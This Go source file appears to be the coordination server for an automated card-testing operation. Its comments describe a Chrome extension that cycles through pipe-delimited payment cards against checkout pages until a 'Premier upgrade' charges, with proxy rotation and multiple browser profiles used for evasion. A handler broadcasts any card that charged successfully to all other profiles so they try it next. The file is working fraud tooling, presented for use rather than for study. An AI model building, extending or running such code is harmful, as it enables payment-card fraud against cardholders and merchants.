func newHTTPState() *httpStateManager {
	transport := buildTransport(nil)
	return &httpStateManager{
		client:       &http.Client{Transport: transport},
		transport:    transport,
		directClient: &http.Client{Transport: buildTransport(nil)},
	}
}

func (s *httpStateManager) clientForRequest() *http.Client {
	s.mu.RLock()
	defer s.mu.RUnlock()
	if !s.config.Enabled || strings.TrimSpace(s.config.Proxy) == "" {
		return s.directClient
	}
	return s.client
}

func (s *httpStateManager) setProxy(enabled bool, proxy string) {
	s.mu.Lock()
	defer s.mu.Unlock()

	s.config = proxyConfig{Enabled: enabled, Proxy: proxy}
	if s.transport != nil {
		s.transport.CloseIdleConnections()
	}

	if !enabled || strings.TrimSpace(proxy) == "" {
		s.transport = buildTransport(nil)
		s.client = &http.Client{Transport: s.transport}
		return
	}

	proxyURL, err := parseProxy(proxy)
	if err != nil {
		logf("Invalid proxy format, using direct")
		s.transport = buildTransport(nil)
		s.client = &http.Client{Transport: s.transport}
		return
	}

	s.transport = buildTransport(proxyURL)
	s.client = &http.Client{Transport: s.transport}
}

func buildTransport(proxyURL *url.URL) *http.Transport {
	return &http.Transport{
		Proxy:                 http.ProxyURL(proxyURL),
		DialContext:           (&net.Dialer{Timeout: 30 * time.Second, KeepAlive: 30 * time.Second}).DialContext,
		ForceAttemptHTTP2:     true,
		MaxIdleConns:          100,
		IdleConnTimeout:       90 * time.Second,
		TLSHandshakeTimeout:   10 * time.Second,
		ExpectContinueTimeout: 1 * time.Second,
	}
}

func parseProxy(raw string) (*url.URL, error) {
	parts := strings.Split(raw, ":")
	switch len(parts) {
	case 2:
		return &url.URL{
			Scheme: "http",
			Host:   net.JoinHostPort(parts[0], parts[1]),
		}, nil
	case 4:
		return &url.URL{
			Scheme: "http",
			User:   url.UserPassword(parts[2], parts[3]),
			Host:   net.JoinHostPort(parts[0], parts[1]),
		}, nil
	default:
		return nil, fmt.Errorf("invalid proxy format")
	}
}

func ensureHitchkrCookie(ctx context.Context) {
	hitchkrState.mu.Lock()
	defer hitchkrState.mu.Unlock()

	if hitchkrState.checked {
		return
	}

	req, err := http.NewRequestWithContext(ctx, http.MethodHead, hitchkrBase+"/api/tools/generate", nil)
	if err != nil {
		logf("Hitchkr cookie check failed: %v", err)
		return
	}
	for k, v := range hitchkrHeaders() {
		req.Header.Set(k, v)
	}

	startedAt := time.Now()
	resp, err := httpState.clientForRequest().Do(req)
	if err != nil {
		logf("Hitchkr cookie check failed after %s: %v", formatDuration(time.Since(startedAt)), err)
		return
	}
	defer resp.Body.Close()

	hitchkrState.checked = true
	logf("Hitchkr cookie OK, status: %d, duration=%s", resp.StatusCode, formatDuration(time.Since(startedAt)))
}

func postJSON(ctx context.Context, label string, requestURL string, headers map[string]string, body any) (any, int, error) {
	startedAt := time.Now()

	bodyBytes, err := json.Marshal(body)
	if err != nil {
		return nil, 0, err
	}

	req, err := http.NewRequestWithContext(ctx, http.MethodPost, requestURL, strings.NewReader(string(bodyBytes)))
	if err != nil {
		return nil, 0, err
	}
	for key, value := range headers {
		req.Header.Set(key, value)
	}

	resp, err := httpState.clientForRequest().Do(req)
	if err != nil {
		logf("HTTP %s failed after %s: %v", label, formatDuration(time.Since(startedAt)), err)
		return nil, 0, err
	}
	defer resp.Body.Close()

	headersDuration := time.Since(startedAt)
	payload, err := readJSONSafely(resp.Body)
	if err != nil {
		logf("HTTP %s status=%d headers=%s total=%s decode_error=%v", label, resp.StatusCode, formatDuration(headersDuration), formatDuration(time.Since(startedAt)), err)
		return nil, resp.StatusCode, err
	}
	logf("HTTP %s status=%d headers=%s total=%s", label, resp.StatusCode, formatDuration(headersDuration), formatDuration(time.Since(startedAt)))
	return payload, resp.StatusCode, nil
}

func readJSONSafely(r io.Reader) (any, error) {
	body, err := io.ReadAll(r)
	if err != nil {
		return nil, err
	}

	var out any
	dec := json.NewDecoder(strings.NewReader(string(body)))
	dec.UseNumber()
	if err := dec.Decode(&out); err == nil {
		return out, nil
	}
	return string(body), nil
}

func mapValue(v any) map[string]any {
	if m, ok := v.(map[string]any); ok {
		return m
	}
	return map[string]any{}
}

func anySlice(v any) []any {
	if items, ok := v.([]any); ok {
		return items
	}
	return nil
}

func stringValue(v any) string {
	switch t := v.(type) {
	case nil:
		return ""
	case string:
		return t
	case json.Number:
		return t.String()
	default:
		return fmt.Sprint(t)
	}
}

func defaultString(value string, fallback string) string {
	if strings.TrimSpace(value) == "" {
		return fallback
	}
	return value
}

func splitCard(card string) (string, string, string, string) {
	parts := strings.Split(card, "|")
	out := [4]string{}
	for i := 0; i < len(parts) && i < 4; i++ {
		out[i] = parts[i]
	}
	return out[0], out[1], out[2], out[3]
}

func escapeMarkdownV2(s string) string {
	if s == "" {
		return ""
	}
	const specials = "_*[]()~`>#+-=|{}.!"
	var b strings.Builder
	b.Grow(len(s) * 2)
	for _, r := range s {
		if strings.ContainsRune(specials, r) {
			b.WriteByte('\\')
		}
		b.WriteRune(r)
	}
	return b.String()
}

func mustLoadLocation(name string) *time.Location {
	location, err := time.LoadLocation(name)
	if err != nil {
		return time.Local
	}
	return location
}

func envString(key string, fallback string) string {
	value := strings.TrimSpace(os.Getenv(key))
	if value == "" {
		return fallback
	}
	return value
}

func envInt(key string, fallback int) int {
	value := strings.TrimSpace(os.Getenv(key))
	if value == "" {
		return fallback
	}
	parsed, err := strconv.Atoi(value)
	if err != nil {
		return fallback
	}
	return parsed
}

func logf(format string, args ...any) {
	log.Printf("[%s] %s", time.Now().Format("15:04:05"), fmt.Sprintf(format, args...))
}

func formatDuration(duration time.Duration) string {
	return fmt.Sprintf("%.1fms", float64(duration.Microseconds())/1000)
}

// handleGpmReportDone is called by the Chrome extension (via WS) when a loop
// completes (Premier success or all cards exhausted). The Python orchestrator
// polls GET /gpm/done?id={profileId} and receives {"done": true} once set.
func handleGpmReportDone(raw json.RawMessage) (any, error) {
	var data struct {
		ProfileID string `json:"profileId"`
	}
	if err := json.Unmarshal(raw, &data); err != nil {
		return nil, err
	}
	if data.ProfileID == "" {
		return nil, fmt.Errorf("gpm_report_done: profileId is required")
	}
	gpmMu.Lock()
	gpmDoneMap[data.ProfileID] = true
	gpmMu.Unlock()
	logf("GPM: profile %s reported done", data.ProfileID)
	return map[string]any{"ok": true}, nil
}

// handleGpmChargeSuccess is called by the extension ONLY when a Premier upgrade
// succeeds (not when all cards are exhausted). Updates gpmLastChargeTime so the
// Python proxy-rotation monitor knows a charge happened recently.
func handleGpmChargeSuccess(raw json.RawMessage) (any, error) {
	gpmLastChargeMu.Lock()
	gpmLastChargeTime = time.Now()
	gpmLastChargeMu.Unlock()
	logf("GPM: charge success recorded at %s", gpmLastChargeTime.Format(time.RFC3339))
	return map[string]any{"ok": true}, nil
}

func cleanupExpiredSheetClaimLocks(now time.Time) {
	for key, lock := range sheetClaimLocks {
		if now.After(lock.ExpiresAt) {
			delete(sheetClaimLocks, key)
		}
	}
}

func handleSheetClaimLockAcquire(raw json.RawMessage) (any, error) {
	var data struct {
		Key   string `json:"key"`
		Owner string `json:"owner"`
		TTLMS int    `json:"ttlMs"`
	}
	if err := json.Unmarshal(raw, &data); err != nil {
		return nil, err
	}
	data.Key = strings.TrimSpace(data.Key)
	data.Owner = strings.TrimSpace(data.Owner)
	if data.Key == "" {
		return nil, fmt.Errorf("sheet_claim_lock_acquire: key is required")
	}
	if data.Owner == "" {
		return nil, fmt.Errorf("sheet_claim_lock_acquire: owner is required")
	}
	ttl := time.Duration(data.TTLMS) * time.Millisecond
	if ttl < 5*time.Second {
		ttl = 60 * time.Second
	} else if ttl > 30*time.Minute {
		ttl = 30 * time.Minute
	}

	now := time.Now()
	sheetClaimMu.Lock()
	defer sheetClaimMu.Unlock()
	cleanupExpiredSheetClaimLocks(now)

	if lock, ok := sheetClaimLocks[data.Key]; ok && lock.Owner != data.Owner && now.Before(lock.ExpiresAt) {
		return map[string]any{
			"acquired":    false,
			"expiresInMs": lock.ExpiresAt.Sub(now).Milliseconds(),
		}, nil
	}

	sheetClaimLocks[data.Key] = sheetClaimLock{
		Owner:     data.Owner,
		ExpiresAt: now.Add(ttl),
	}
	return map[string]any{"acquired": true, "ttlMs": ttl.Milliseconds()}, nil
}

func handleSheetClaimLockRelease(raw json.RawMessage) (any, error) {
	var data struct {
		Key   string `json:"key"`
		Owner string `json:"owner"`
	}
	if err := json.Unmarshal(raw, &data); err != nil {
		return nil, err
	}
	data.Key = strings.TrimSpace(data.Key)
	data.Owner = strings.TrimSpace(data.Owner)
	if data.Key == "" || data.Owner == "" {
		return map[string]any{"ok": false, "released": false}, nil
	}

	sheetClaimMu.Lock()
	defer sheetClaimMu.Unlock()
	if lock, ok := sheetClaimLocks[data.Key]; ok && lock.Owner == data.Owner {
		delete(sheetClaimLocks, data.Key)
		return map[string]any{"ok": true, "released": true}, nil
	}
	return map[string]any{"ok": true, "released": false}, nil
}

func normalizeSheetQueueScope(source, sheetID, sheetName string) (string, string, string) {
	source = strings.TrimSpace(source)
	sheetID = strings.TrimSpace(sheetID)
	sheetName = strings.TrimSpace(sheetName)
	if source == "" {
		source = "sheet"
	}
	return source, sheetID, sheetName
}

func sheetQueueKey(source, sheetID, sheetName string, rowIndex int) string {
	return source + ":" + sheetID + ":" + sheetName + ":" + strconv.Itoa(rowIndex)
}

func sheetQueueTTL(ttlMS int) time.Duration {
	ttl := time.Duration(ttlMS) * time.Millisecond
	if ttl < 5*time.Second {
		return 5 * time.Minute
	}
	if ttl > 30*time.Minute {
		return 30 * time.Minute
	}
	return ttl
}

func sheetQueueKeepDuration(keepMS int) time.Duration {
	keep := time.Duration(keepMS) * time.Millisecond
	if keep < time.Minute {
		return 24 * time.Hour
	}
	if keep > 7*24*time.Hour {
		return 7 * 24 * time.Hour
	}
	return keep
}

func ensureSheetQueueLoadedLocked() {
	if sheetQueueLoaded {
		return
	}
	sheetQueueLoaded = true
	data, err := os.ReadFile(sheetQueueFile)
	if err != nil {
		if !errors.Is(err, os.ErrNotExist) {
			logf("SheetQueue: load state failed: %v", err)
		}
		return
	}
	var rows map[string]sheetQueueRowState
	if err := json.Unmarshal(data, &rows); err != nil {
		logf("SheetQueue: parse state failed: %v", err)
		return
	}
	if rows != nil {
		sheetQueueRows = rows
	}
}

func persistSheetQueueLocked() {
	data, err := json.MarshalIndent(sheetQueueRows, "", "  ")
	if err != nil {
		logf("SheetQueue: marshal state failed: %v", err)
		return
	}
	tmpPath := sheetQueueFile + ".tmp"
	if err := os.WriteFile(tmpPath, data, 0o600); err != nil {
		logf("SheetQueue: write state failed: %v", err)
		return
	}
	if err := os.Rename(tmpPath, sheetQueueFile); err != nil {
		logf("SheetQueue: rename state failed: %v", err)
	}
}

func cleanupExpiredSheetQueueLocked(now time.Time) bool {
	changed := false
	for key, row := range sheetQueueRows {
		if now.After(row.ExpiresAt) {
			delete(sheetQueueRows, key)
			changed = true
		}
	}
	return changed
}

func handleSheetQueueClaim(raw json.RawMessage) (any, error) {
	var data sheetQueueClaimRequest
	if err := json.Unmarshal(raw, &data); err != nil {
		return nil, err
	}
	data.Source, data.SheetID, data.SheetName = normalizeSheetQueueScope(data.Source, data.SheetID, data.SheetName)
	data.Owner = strings.TrimSpace(data.Owner)
	if data.SheetID == "" || data.SheetName == "" {
		return nil, fmt.Errorf("sheet_queue_claim: sheetId and sheetName are required")
	}
	if data.Owner == "" {
		return nil, fmt.Errorf("sheet_queue_claim: owner is required")
	}
	if len(data.Candidates) == 0 {
		return map[string]any{"claimed": false, "reason": "no_candidates"}, nil
	}
	if len(data.Candidates) > 2000 {
		data.Candidates = data.Candidates[:2000]
	}

	now := time.Now()
	ttl := sheetQueueTTL(data.TTLMS)

	sheetQueueMu.Lock()
	defer sheetQueueMu.Unlock()
	ensureSheetQueueLoadedLocked()
	changed := cleanupExpiredSheetQueueLocked(now)

	for _, candidate := range data.Candidates {
		if candidate.RowIndex <= 0 {
			continue
		}
		key := sheetQueueKey(data.Source, data.SheetID, data.SheetName, candidate.RowIndex)
		if row, ok := sheetQueueRows[key]; ok && now.Before(row.ExpiresAt) {
			if row.Status == "active" || row.Status == "completed" {
				continue
			}
		}

		state := sheetQueueRowState{
			Source:    data.Source,
			SheetID:   data.SheetID,
			SheetName: data.SheetName,
			RowIndex:  candidate.RowIndex,
			Owner:     data.Owner,
			Status:    "active",
			UpdatedAt: now,
			ExpiresAt: now.Add(ttl),
		}
		sheetQueueRows[key] = state
		persistSheetQueueLocked()
		logf("SheetQueue: claimed source=%s sheet=%s row=%d owner=%s ttl=%s", data.Source, data.SheetName, candidate.RowIndex, data.Owner, ttl)
		return map[string]any{
			"claimed":        true,
			"source":         data.Source,
			"sheetName":      data.SheetName,
			"rowIndex":       candidate.RowIndex,
			"owner":          data.Owner,
			"ttlMs":          ttl.Milliseconds(),
			"previousStatus": candidate.PreviousStatus,
			"nextStatus":     candidate.NextStatus,
		}, nil
	}

	if changed {
		persistSheetQueueLocked()
	}
	return map[string]any{"claimed": false, "reason": "no_available_candidate"}, nil
}

func handleSheetQueueComplete(raw json.RawMessage) (any, error) {
	var data sheetQueueRowRequest
	if err := json.Unmarshal(raw, &data); err != nil {
		return nil, err
	}
	data.Source, data.SheetID, data.SheetName = normalizeSheetQueueScope(data.Source, data.SheetID, data.SheetName)
	data.Owner = strings.TrimSpace(data.Owner)
	if data.SheetID == "" || data.SheetName == "" || data.RowIndex <= 0 || data.Owner == "" {
		return map[string]any{"ok": false, "completed": false}, nil
	}

	now := time.Now()
	keep := sheetQueueKeepDuration(data.KeepMS)
	key := sheetQueueKey(data.Source, data.SheetID, data.SheetName, data.RowIndex)

	sheetQueueMu.Lock()
	defer sheetQueueMu.Unlock()
	ensureSheetQueueLoadedLocked()
	cleanupExpiredSheetQueueLocked(now)

	row, exists := sheetQueueRows[key]
	if exists && row.Owner != "" && row.Owner != data.Owner {
		return map[string]any{"ok": true, "completed": false, "reason": "owner_mismatch"}, nil
	}
	sheetQueueRows[key] = sheetQueueRowState{
		Source:    data.Source,
		SheetID:   data.SheetID,
		SheetName: data.SheetName,
		RowIndex:  data.RowIndex,
		Owner:     data.Owner,
		Status:    "completed",
		Result:    strings.TrimSpace(data.Result),
		UpdatedAt: now,
		ExpiresAt: now.Add(keep),
	}
	persistSheetQueueLocked()
	return map[string]any{"ok": true, "completed": true, "keepMs": keep.Milliseconds()}, nil
}

func handleSheetQueueRelease(raw json.RawMessage) (any, error) {
	var data sheetQueueRowRequest
	if err := json.Unmarshal(raw, &data); err != nil {
		return nil, err
	}
	data.Source, data.SheetID, data.SheetName = normalizeSheetQueueScope(data.Source, data.SheetID, data.SheetName)
	data.Owner = strings.TrimSpace(data.Owner)
	if data.SheetID == "" || data.SheetName == "" || data.RowIndex <= 0 || data.Owner == "" {
		return map[string]any{"ok": false, "released": false}, nil
	}

	now := time.Now()
	key := sheetQueueKey(data.Source, data.SheetID, data.SheetName, data.RowIndex)

	sheetQueueMu.Lock()
	defer sheetQueueMu.Unlock()
	ensureSheetQueueLoadedLocked()
	changed := cleanupExpiredSheetQueueLocked(now)
	if row, ok := sheetQueueRows[key]; ok && row.Owner == data.Owner && row.Status == "active" {
		delete(sheetQueueRows, key)
		persistSheetQueueLocked()
		return map[string]any{"ok": true, "released": true}, nil
	}
	if changed {
		persistSheetQueueLocked()
	}
	return map[string]any{"ok": true, "released": false}, nil
}

// registerWsClient adds a connected client to the global registry.
func registerWsClient(c *wsConn) {
	wsClientsMu.Lock()
	wsClients[c] = struct{}{}
	wsClientsMu.Unlock()
}

// unregisterWsClient removes a client from the registry on disconnect.
func unregisterWsClient(c *wsConn) {
	wsClientsMu.Lock()
	delete(wsClients, c)
	wsClientsMu.Unlock()
}

// handleShareHotCard broadcasts a successfully-charged card to every OTHER connected
// profile so they can inject it as the very next card to try on their own checkout URL.
// The push frame has no requestId → extension onmessage recognises it as a server-push.
func (c *wsConn) handleShareHotCard(raw json.RawMessage) (any, error) {
	var data struct {
		Card string `json:"card"`
	}
	if err := json.Unmarshal(raw, &data); err != nil {
		return nil, err
	}
	if data.Card == "" {
		return nil, fmt.Errorf("gpm_share_hot_card: card is required")
	}
	cardShort := data.Card
	if idx := strings.Index(cardShort, "|"); idx >= 0 {
		cardShort = cardShort[:idx]
	}

	pushMsg, _ := json.Marshal(map[string]any{
		"type": "hot_card",
		"card": data.Card,
	})

	wsClientsMu.Lock()
	count := 0
	for cl := range wsClients {
		if cl == c {
			continue // exclude sender
		}
		go cl.writeTextFrame(pushMsg)
		count++
	}
	wsClientsMu.Unlock()

	logf("HotCard: broadcast %s*** → %d other client(s)", cardShort[:min(len(cardShort), 8)], count)
	return map[string]any{"ok": true, "broadcast": count}, nil
}
